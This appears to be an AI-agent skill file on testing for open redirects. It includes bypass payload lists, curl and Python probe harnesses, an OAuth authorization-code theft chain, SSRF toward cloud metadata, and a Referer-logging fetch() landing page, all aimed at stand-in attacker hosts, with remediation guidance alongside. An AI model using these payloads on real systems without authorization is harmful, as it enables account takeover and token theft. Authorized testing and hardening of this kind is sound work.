---
name: attack-open-redirect
description: "Open redirect — parameter discovery, bypass families, and the OAuth/phishing chains it enables"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - open-redirect
  - web
  - oauth
  - phishing
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-601
chains_with:
  - attack-cors
  - attack-host-header
  - oauth-oidc-misconfiguration
prerequisites: []
severity_boost:
  attack-cors: "Open redirect on an allowlisted origin defeats a correct CORS allowlist"
  oauth-oidc-misconfiguration: "Open redirect in redirect_uri = authorization code theft"
  attack-host-header: "Both derive from the same trust-the-request pattern"
---

# Open Redirect

> **AI LOAD INSTRUCTION**: An open redirect on its own is **low severity** — and reporting it as
> high is one of the fastest ways to lose a triager's trust. Its real value is as a **chain
> component**, and the chain is what you must find and report. The three that matter:
> **OAuth `redirect_uri` abuse** (code/token theft), **CORS allowlist bypass** (an allowlisted
> origin that redirects to you defeats a correct policy), and **SSRF/filter bypass** (a
> redirect defeats a URL allowlist because the *destination* was never validated).
>
> The other half of the skill is bypassing the protection. Modern applications do validate the
> redirect target, which is why the `//evil.com`, `/\evil.com`, `@evil.com`, and
> relative-path families exist — each defeats a different validation approach. And the last
> case matters most in modern apps: a redirect that stays *within* the origin but escapes
> *into the path* (`/%2F%2Fevil.com`) is frequently missed by both the filter and the tester.

## 0. RELATED ROUTING

- [open-redirect](../open-redirect/SKILL.md) — the long-form companion; load alongside this file
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — the highest-impact chain
- [attack-cors](../attack-cors/SKILL.md) — defeating a CORS allowlist
- [attack-host-header](../attack-host-header/SKILL.md) — the same trust gap in URL construction
- [attack-ssrf](../attack-ssrf/SKILL.md) — redirects that defeat URL allowlists
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting the chain, not the redirect

---

## 1. FINDING THE PARAMETERS

Redirect parameters have recognisable names. Enumerate them rather than guessing blind.

**High-frequency parameter names:**

```text
url  uri  link  redirect  redirect_uri  redirect_url  redirectUrl
return  return_to  returnTo  return_url  returnUrl  returnto
next  next_url  dest  destination  target  to  out  go  goto
continue  callback  callback_url  forward  rurl  reload  checkout_url
image_url  file  view  login?next=  logout?redirect=
```

**Where they hide:**

| Context | Example |
|---|---|
| login / logout | `/login?next=/dashboard` |
| OAuth flows | `redirect_uri` in the authorize request |
| SSO callback | `return_to`, `RelayState` |
| email links | unsubscribe, verify, reset |
| language / locale switch | `?lang=`, and a redirect to the localised path |
| pagination and view state | `?view=`, `?page=` on some frameworks |
| share / export | `?share_url=`, `?export=` |
| payment return | `?return_url=` on checkout flows |

**Test in the login flow first.** The `next`/`return` parameter after authentication is the
most universally present redirect parameter in any web application, and it is frequently
implemented with the least validation because it "only" affects post-login navigation.

**Also test the non-obvious sinks** — meta refresh tags, JavaScript `location.href`
assignments, and `Refresh` HTTP headers, which are excluded from many scanners:

```http
Refresh: 0; url=https://evil.com
```

---

## 2. THE BYPASS FAMILIES

Validation is usually a check for a trusted prefix or a rejection of `http`. Each family below
defeats a specific validation approach.

### 2.1 Protocol-relative and scheme variants

```text
//evil.com
///evil.com
////evil.com
\/\/evil.com
/\/evil.com
https:evil.com
http:/evil.com
https:///evil.com
Https://evil.com
hTtPs://evil.com
%09//evil.com
/ /evil.com
```

**`//evil.com` is the highest-yield single payload.** It is a valid protocol-relative URL that
browsers resolve to `https://evil.com` when the current page is HTTPS. A filter checking that
the value "starts with `/`" passes it.

### 2.2 The `@` and userinfo trick

```text
https://TARGET.com@evil.com
https://target.com.evil.com
https://evil.com#TARGET.com
https://evil.com?TARGET.com
https://evil.com\.TARGET.com
```

`https://TARGET.com@evil.com` is a URL whose *host* is `evil.com` and whose *userinfo* is
`TARGET.com`. A filter that checks whether the string contains `TARGET.com` passes it while
the browser navigates to the attacker. **This defeats substring validation completely.**

### 2.3 Backslash confusion

Browsers normalise `\` to `/` in URL paths — but many server-side validators do not:

```text
/\evil.com
\/evil.com
\\evil.com
\\\\evil.com
/%5Cevil.com
https:/\evil.com
```

**This family is the most commonly missed** because the payload looks wrong to a human reading
it as a path.

### 2.4 Encoding

```text
%2F%2Fevil.com
%2f%2fevil.com
/%2F/evil.com
https%3A%2F%2Fevil.com
https:%2F%2Fevil.com
%68%74%74%70%73%3A%2F%2Fevil.com
//evil%2ecom
//evil.com%2f
```

**Double-encoding** (`%252F%252F`) defeats validators that decode once and then pass the value
on to something that decodes again.

### 2.5 Path-relative escapes (the modern case)

The application requires a relative path and rejects anything with a scheme or a leading `//`.
The escape is a value that is a valid relative path *and* resolves off-origin:

```text
/redirect?url=/..//evil.com
/redirect?url=/%2F%2Fevil.com
/redirect?url=/.//evil.com
/redirect?url=/..%2F%2Fevil.com
```

**This is the payload family that modern frameworks are most vulnerable to**, because the
validator's mental model is "relative paths are safe" and the browser's resolution rules
disagree.

### 2.6 Whitelist-targeted payloads

When the app allows only its own domains, target a **sibling that redirects onward**:

```text
https://TARGET.com/redirect?url=https://evil.com     ← chain two redirects
https://TARGET.com/out?url=//evil.com
https://trusted-partner.com/redirect?to=//evil.com
```

Chaining through the application's own trusted redirect namespaces is a reliable bypass of a
suffix allowlist.

### 2.7 Non-HTTP vectors

```text
javascript:alert(document.domain)
data:text/html,<script>location='https://evil.com'</script>
vbscript:msgbox(1)
file:///etc/passwd
```

**`javascript:` in a redirect sink is XSS**, not an open redirect. Report it as XSS with the
higher severity, and note that it may bypass an XSS filter that does not inspect redirect
parameters.

---

## 3. THE CHAINS THAT MAKE IT MATTER

This is the section that determines your severity. Report the chain.

### 3.1 OAuth / OIDC `redirect_uri` — the critical chain

If the authorization server accepts a `redirect_uri` that it validates loosely, and you can
make that URI redirect onward, you steal the authorization code:

```text
GET /authorize?client_id=X&response_type=code
    &redirect_uri=https://TARGET.com/redirect?url=https://evil.com
```

The authorization code lands on `evil.com` in the `Referer` or as a query parameter. Exchange
it for a token. **That is full account takeover.**

Where to look: prefix-matching validation (`https://TARGET.com` accepted for
`https://TARGET.com.evil.com`), path-suffix allowance, and any allowlisted URI that itself
contains a redirect parameter. See [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md).

### 3.2 CORS allowlist bypass

A CORS policy that correctly allowlists `https://TARGET.com` is defeated if
`https://TARGET.com/redirect?url=https://evil.com` exists: the browser sends
`Origin: https://TARGET.com` and receives `Access-Control-Allow-Origin: https://TARGET.com`,
then the response redirects the actual data request to you. See [attack-cors](../attack-cors/SKILL.md).

### 3.3 SSRF filter bypass

A server-side URL allowlist that permits `https://TARGET.com` is defeated when
`https://TARGET.com/redirect?url=http://169.254.169.254/` redirects the server's fetch into
the metadata service. The allowlist validated the first hop. See [attack-ssrf](../attack-ssrf/SKILL.md) §4.4.

### 3.4 Phishing and trust abuse

A link to `https://TARGET.com/redirect?url=https://evil-clone.com` shows the target's domain in
the email, the link preview, and the address bar at click time. This is a real social-
engineering capability and it is why the finding is worth reporting even without a technical
chain.

### 3.5 Token leakage via `Referer`

If the redirect target is attacker-controlled and the source page URL contains a token
(session ID, reset token, OAuth code), the browser sends it in the `Referer` header. Test
whether the redirect happens before the page strips it.

---

## 4. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Open redirect in an OAuth `redirect_uri`, code theft demonstrated | **Critical (P1)** | the stolen code and the exchanged token |
| Open redirect defeating a CORS allowlist with a credentialed read | **High (P2)** | the CORS headers plus the exfiltration |
| `javascript:` / `data:` accepted in a redirect sink | **High (P2)** — reported as XSS | execution in a browser |
| Redirect defeating an SSRF allowlist to reach internal targets | **High (P2)** | the internal response |
| Open redirect enabling a convincing phishing link | **Low–Medium (P4)** | the working redirect |
| Plain open redirect, no chain | **Low (P4)** | the `Location` header |
| Internal-only redirect (same origin, non-attacker destination) | **Informational (P5)** | — |

**Say plainly which you have.** "Open redirect, low severity, chainable to CORS bypass on the
main API" is a stronger report than inflating the redirect itself.

---

## 5. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the exact parameter and the full request | reproducibility |
| the response showing `Location: https://evil.com` | proves the redirect |
| the bypass payload used, and why it defeated the filter | the bypass is often the finding |
| **the browser following it** — a screenshot of the address bar on your domain | proves client-side behaviour, not just a header |
| for OAuth: the authorize request, the stolen code, and the exchanged token | the full chain |
| for CORS: the `ACAO`/`ACAC` headers on the redirect chain | the chain evidence |
| whether it fires on `GET` only or also `POST` | affects exploitability from a form |
| a **control**: a same-origin redirect that is correctly allowed | proves the validation exists and was defeated |

**The browser screenshot matters.** A `Location` header proves server behaviour; the browser
resolving `//evil.com` off-origin is a different — and required — claim.

**False positives to exclude:**

| Looks like an open redirect | Actually |
|---|---|
| the app returns `302` to a **relative** path | safe — resolves within the origin |
| a `Location` header pointing to a fixed partner domain | allowlisted, intended |
| the redirect requires an authenticated session | still a finding, but note the precondition |
| a JavaScript `window.location` with a validated value | verify it reaches the sink unmodified |
| `//evil.com` blocked, but you did not try `/\evil.com` | incomplete test, not a negative result |
| the value is reflected in the page but not used for navigation | reflection, not a redirect |

---

## 6. REMEDIATION REFERENCE

1. **Use an allowlist of relative paths** — accept only a path the application itself owns, and reject anything containing a scheme, `//`, a backslash, or an encoded equivalent.
2. **Never derive the destination from user input** — map an opaque identifier to a server-side destination (`?next=dashboard` → `/dashboard`). This eliminates the entire bug class.
3. **If external redirects are required, present a confirmation page** — an interstitial that shows the destination and requires a click removes the phishing value.
4. **Resolve the URL server-side and validate the final host** — parse the URL properly, extract the host, and compare it to the allowlist. Do not validate the raw string; substring and prefix checks are what the `@` and backslash families defeat.
5. **Register exact OAuth `redirect_uri` values** — full-string, case-sensitive exact match with no wildcards and no path suffixes. This is the control that prevents code theft.
6. **Reject `javascript:`, `data:`, `vbscript:`, and `file:` schemes in every redirect sink** — and review the XSS filter to ensure redirect parameters are covered by it.
7. **Strip the fragment and reject userinfo** — a URL with `@` before the host or a `#` after it should be rejected outright.
8. **Do not rely on the client to sanitise** — the value reaches the `Location` header from the server. Validate at the point of the redirect, every time.

---

## 7. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the `Location` header point at **a host you control**, not merely contain a URL? | the redirect, not a reflection |
| 2 | Was there a **control** - a same-site path and an invalid value, which stay on-site? | the check exists and you bypassed it |
| 3 | Did a **browser actually navigate** to your host, `Referer` and all? | the impact |
| 4 | Did the redirect fire on a path where **the target trusts the destination** (an OAuth callback, a login link)? | the severity |
| 5 | Which bypass family: **scheme-relative, backslash, encoding, at-sign, or a parser difference**? | the fix |
| 6 | Did you test both the **redirect endpoint** and the **link-generation** surfaces? | coverage |
| 7 | Did you avoid pointing the redirect at a **live third-party site**? | engagement integrity |

**A `Location` header on your own host, reached by a browser, is the bar.** A parameter that is reflected
in the page is not a redirect; the navigation is.

---

## 8. EXECUTION PRIMITIVES

Open redirects are proven by **a `Location` header pointing at a host you control, with the on-site and
invalid controls, and a browser navigation recorded**. Every block ends at a redirect.

### 8.1 The control pair, and the redirect

```bash
T="https://target.example"; ME="attacker.example"
# CONTROL 1: a same-site relative path, which must stay on-site
curl -sS -D- -o /dev/null "$T/redirect?next=/account" 2>&1 | grep -iE '^HTTP/|^location'
# CONTROL 2: an invalid value, which must fall back to a safe default or an error
curl -sS -D- -o /dev/null "$T/redirect?next=not-a-url" 2>&1 | grep -iE '^HTTP/|^location'
# CONTROL 3: an internal absolute URL, which is legitimate and must be allowed
curl -sS -D- -o /dev/null "$T/redirect?next=https://target.example/account" 2>&1 | grep -iE '^HTTP/|^location'
# THE TEST: an absolute URL on your host
curl -sS -D- -o /dev/null "$T/redirect?next=https://$ME/" 2>&1 | grep -iE '^HTTP/|^location'
echo "-> a Location on $ME with a 302/301 while the controls stayed on-site is the finding"
# and never follow it blindly - show what would have been sent
curl -sS -D- -o /dev/null -L --max-redirs 0 "$T/redirect?next=https://$ME/" 2>&1 | head -5
```

**The three controls are what make it a redirect rather than a fallback.** A 302 to your host with no
same-site control is ambiguous: the endpoint may redirect anywhere by design.

### 8.2 The bypass families

```bash
T="https://target.example"; ME="attacker.example"; IP="1.2.3.4"
# each family defeats a DIFFERENT check, and the report should name the one that worked
probe() { printf '%-44s ' "$2"; curl -sS -D- -o /dev/null "$T/redirect?next=$1" 2>&1 | grep -i '^location' | tr -d '\r' || echo "<no location>"; }
probe "https://$ME/"                          "absolute"
probe "//$ME/"                                "scheme-relative (//)"
probe "/\\$ME/"                               "backslash (\\\\)"
probe "https:/\\$ME/"                         "slash-backslash mix"
probe "https:%2f%2f$ME/"                      "encoded slashes"
probe "https:%5c%5c$ME/"                      "encoded backslash"
probe "https://target.example@$ME/"           "at-sign (userinfo)"
probe "https://$ME.target.example/"           "prefix lookalike"
probe "https://target.example.$ME/"           "suffix lookalike"
probe "https://$ME\\@target.example/"         "at-sign after backslash"
probe "http://$IP/"                           "raw IP"
probe "https://$ME:443/"                      "explicit port"
probe "https://$ME%00.target.example/"        "null byte"
probe "https://$ME%09.target.example/"        "tab"
probe "https://$ME%0d%0a/"                    "crlf"
probe "javascript:alert(1)"                   "javascript: scheme"
probe "data:text/html,<script>"               "data: scheme"
probe "HTTPS://$ME/"                          "uppercase scheme"
probe "https://$ME./"                         "trailing dot"
probe "https://$ME%E3%80%82/"                 "ideographic full stop"
echo "-> the families that redirect to YOUR host are the bypass; record which, per parameter"
```

**Each family defeats a specific check.** `//host` defeats a check that requires a scheme, `host/\\x`
defeats a check that looks at the first slash, and `user@host` defeats a check that looks for the trusted
name anywhere in the string.

### 8.3 The parser-difference and reference families

```python
# the bypasses that come from DIFFERENT components parsing the URL differently
print("the families, and the check each defeats:")
for row in [
 ("//attacker.example",                "a check that requires http:// or https://"),
 ("/\\attacker.example",               "a check that looks only at the FIRST character"),
 ("https://target.example@attacker.example", "a check that searches for the trusted name anywhere"),
 ("https://attacker.example#target.example", "a check that requires the string to END with the trusted name"),
 ("https://attacker.example?target.example", "the same, with a query string"),
 ("https://attacker.example\\@target.example", "a normalizer that decodes before checking"),
 ("////attacker.example",              "a check that strips one leading slash"),
 ("https:/attacker.example",           "a check that requires two slashes"),
 ("https:attacker.example",            "a browser that resolves a scheme with no slashes"),
 ("http:attacker.example",             "the same, over http"),
 ("%2f%2fattacker.example",            "a decode-after-check implementation"),
 ("https://attacker.example/..%2ftarget.example", "a path normalizer"),
 ("https://ATTACKER.EXAMPLE",          "a case-sensitive comparison"),
 ("https://attacker.example..target.example", "a suffix comparison with a loose anchor"),
 ("https://target.example%2eattacker.example", "an encoded dot"),
]:
    print("  %-46s %s" % row)
print()
print("THE SIBLING CHECK: some targets validate the host at REQUEST time and use it at RESPONSE")
print("time (or vice versa). Test whether the value is validated when redirected TO, not just from.")
print("This is the 'checked here, used there' family and it is a different fix.")
```

**Name the component that parsed it differently.** A browser resolves `https:attacker.example` to your
host; a validator that requires `//` does not see a host at all.

### 8.4 The OAuth and SSO chain, which is the high-severity case

```bash
T="https://target.example"; ME="attacker.example"
# an open redirect on a trusted domain turns a strict OAuth redirect_uri allowlist into a token leak
echo "1) the OAuth authorize endpoint, with a REDIRECT_URI that IS allowlisted"
curl -sS -D- -o /dev/null \
  "https://idp.target.example/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://target.example/callback&scope=openid" \
  2>&1 | grep -iE '^HTTP/|^location'
echo "2) THE CHAIN: the allowlisted callback then redirects onward, carrying the code"
curl -sS -D- -o /dev/null \
  "https://target.example/callback?code=AUTHCODE&next=https://$ME/" 2>&1 | grep -iE '^HTTP/|^location'
echo "-> the Location must carry the code to $ME - that is the finding, and it is a different report"
echo "   from the open redirect alone. State BOTH halves and how they compose."
echo
echo "3) ALSO CHECK the login/logout/session surfaces, which are the other trusted-destination cases"
for P in "/login?next=" "/logout?return=" "/session/end?redirect=" "/auth/complete?continue=" "/sso?RelayState="; do
  printf '%-40s ' "$P"
  curl -sS -D- -o /dev/null "$T${P}https://$ME/" 2>&1 | grep -i '^location' | tr -d '\r' || echo "<none>"
done
```

**The chain is the finding, and it must be stated as a chain.** An open redirect alone is moderate; an
open redirect on the OAuth callback is a token theft, and the report needs both steps and the composition.

### 8.5 The browser proof, which is the only navigation that counts

```html
<!-- serve this from your host; the point is the Referer and the navigation, not the header -->
<!doctype html><html><body>
<p><a id="l" href="https://target.example/redirect?next=https://attacker.example/landing">click</a></p>
<script>
// 1) the direct navigation, which is what a victim would follow
location.href = "https://target.example/redirect?next=https://attacker.example/landing";
</script></body></html>
```

```
CHECKLIST for this test:
  1. the redirect must be followed by a BROWSER, so the Referer and the victim's context are present
  2. the landing page must record document.referrer, which proves the target sent the browser
  3. the control navigation with next=/account must land on-site
  4. the finding is the navigation to your host with a Referer of the target - that is the artefact
  5. do NOT point the redirect at a real third-party site; use your own landing page
```

```python
# the landing page records what the target leaked in the Referer, which is the evidence
print("a landing page that logs document.referrer shows whether the target leaked a path or a token:")
print("""  <script>
  fetch('/landing-hit?ref=' + encodeURIComponent(document.referrer)
        + '&url=' + encodeURIComponent(location.href));
  </script>""")
print()
print("a Referer of https://target.example/reset?token=... is a TOKEN LEAK as well as a redirect.")
```

**The `Referer` is part of the finding.** A redirect from a token-bearing page leaks that token to your
host, and the landing page's log is what proves it.

### 8.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests
T = "https://target.example"; ME = "attacker.example"
PAYLOADS = [
 ("absolute",        f"https://{ME}/"),
 ("scheme-relative", f"//{ME}/"),
 ("backslash",       f"/\\{ME}/"),
 ("encoded-slash",   f"https:%2f%2f{ME}/"),
 ("userinfo",        f"https://{T.split('//')[1]}@{ME}/"),
 ("prefix",          f"https://{ME}.{T.split('//')[1]}/"),
 ("suffix",          f"https://{T.split('//')[1]}.{ME}/"),
 ("null-byte",       f"https://{ME}%00.{T.split('//')[1]}/"),
 ("uppercase",       f"HTTPS://{ME}/"),
 ("trailing-dot",    f"https://{ME}./"),
]
CONTROLS = [("control-relative", "/account"),
            ("control-invalid",  "not-a-url"),
            ("control-internal", f"https://{T.split('//')[1]}/account")]

def loc(v):
    try:
        r = requests.get(f"{T}/redirect", params={"next": v}, timeout=10, allow_redirects=False)
        return r.status_code, r.headers.get("Location", "")
    except Exception as e:
        return "ERR", type(e).__name__

print("=== CONTROLS (must stay on-site) ===")
for name, v in CONTROLS:
    st, l = loc(v); print("  %-18s %-6s %s" % (name, st, l[:70]))
print()
print("=== PAYLOADS ===")
hits = []
for name, v in PAYLOADS:
    st, l = loc(v)
    off = ME in l and T.split('//')[1] not in l.split(ME)[0][-30:]
    if off: hits.append((name, l))
    print("  %-18s %-6s %s%s" % (name, st, l[:70], "   <-- OFF-SITE" if off else ""))
print()
print("OFF-SITE PAYLOADS:", hits or "none")
print("FINDING = an off-site Location while the three controls stayed on-site.")
print("NEXT    = follow it in a browser and record the navigation and the Referer.")
PY
```

**Off-site payloads plus the control rows.** The control rows are the "on-site by default" baseline that
makes the off-site rows a defect.

---

## 9. EVIDENCE STANDARD — REDIRECT ARTEFACTS

| Item | Why |
|---|---|
| The **same-site, invalid, and internal controls' `Location` values** | prove the endpoint validates and defaults safely |
| The **off-site `Location`**, with the full URL | the finding |
| The **bypass family** that worked, per parameter | the fix |
| The **browser navigation** to the landing page, and the `Referer` | the impact, in a victim's context |
| The **`Referer` content**, where it carries a token or a path | a second, higher-severity finding |
| Any **OAuth/SSO chain**, with both steps and the composition | the severity step-up |
| The **endpoint's role** (login, logout, callback, notification) | determines what trust it carries |
| The **scheme families** tested, including `javascript:` and `data:` | an XSS escalation |
| Whether the destination is **validated at request or response time** | the fix location |
| Confirmation that **no third-party site was used as a target** | engagement integrity |

Report the **redirect and the controls**: "`GET /redirect?next=/account` and `?next=not-a-url` both return
`302` with `Location: https://target.example/account` and `Location: https://target.example/`, which are
the on-site controls, and `?next=https://target.example/account` is allowed, which is the legitimate
absolutization control. `?next=//attacker.example/` returns `302` with
`Location: //attacker.example/`, and a browser following it lands on my host with
`document.referrer = https://target.example/redirect?next=...`, which is the finding. The same endpoint
accepts `https://target.example@attacker.example/` and `/\attacker.example/`, which are a second and a
third bypass of the same check. `GET /callback?next=...` is the OAuth callback for the `APP` client and
forwards the authorisation code to the same parameter, so the redirect composes into a code leak, which is
reported separately", never "the application has an open redirect".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **`200` with the URL in the body**, no `Location` header | a reflection, not a redirect |
| A `Location` that **stays on-site** for every payload | the check is working |
| A redirect to a **user-submitted URL with an interstitial warning page** | the warning is a control; verify whether it is bypassable |
| A **`javascript:` URL that the browser does not execute** | verify the execution, not the header |
| A redirect **only reachable by an authenticated administrator** | the privilege is required; check whether it is reachable lower |
| A **fragment-only** difference (`#...`) | fragments are not sent to the server |
| A redirect endpoint **explicitly documented as a URL forwarder** | by design; verify the trust placed in it |
| A **relative path traversal** that lands on a different on-site page | a different finding |
| A payload that requires **a header you cannot set from a browser** | not reachable in a victim's context |
| A finding that pointed a redirect at **a live third-party site** | an incident you caused |
| A redirect on a **staging host** with no trust relationship | verify the deployment and the trust |

**A `Location` on your host, with the on-site controls, and a browser navigation.** Reflected URLs and
on-site-only redirects are the two ways this family produces non-findings.

---

## 10. REMEDIATION REFERENCE — DESTINATION VALIDATION HARDENING

1. **Do not accept a redirect destination from the request at all; use a server-side map from an opaque key to a destination** - it removes the class, and it is the only complete fix.
2. **Where a destination must be supplied, parse it with the URL library and allow only a relative path that begins with a single `/` and does not begin with `//` or `/\`** - the relative-only rule defeats every scheme and authority bypass.
3. **Compare against a server-side allowlist of full origins, using an exact string comparison after parsing, never a prefix, suffix, or substring search** - the `user@host` and lookalike families are all matching defects.
4. **Reject a value containing backslashes, encoded slashes, control characters, or a `userinfo` component** - each is a parser-difference bypass.
5. **Normalize before validating and validate the NORMALIZED value, and use the same library for validation and for the redirect** - "checked here, used there" is a component-disagreement defect.
6. **Never allow `javascript:`, `data:`, `vbscript:`, or `blob:` schemes** - a permitted scheme family is an XSS primitive.
7. **Show an interstitial for any off-site destination, or require a confirmation, so a redirect cannot be silent** - it preserves the legitimate use case while removing the silent leak.
8. **Treat the OAuth callback, the SSO `RelayState`, the logout return URL, and the password-reset redirect as high-trust surfaces and lock them to an exact allowlist** - the chain in 8.4 is where this defect becomes a token theft.
9. **Do not carry a token, a code, or a path parameter across a redirect; strip anything sensitive and re-issue it server-side** - it removes the `Referer` leak.
10. **Set `Referrer-Policy: strict-origin-when-cross-origin` or `no-referrer` on pages that carry a token** - it bounds the leak when a redirect exists.
11. **Test every redirect parameter with the full bypass list on every release, and add a test asserting that an off-site value is rejected** - this family regresses whenever a URL helper is refactored.

---

## 11. RELATED SIBLINGS - LOAD TOGETHER

- [open-redirect](../open-redirect/SKILL.md) - the full technique reference
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - the chain that turns a redirect into a token leak
- [attack-host-header](../attack-host-header/SKILL.md) - the other header-driven destination defect
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the destination of a permitted `javascript:` scheme
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - the `RelayState` surface with the same trust
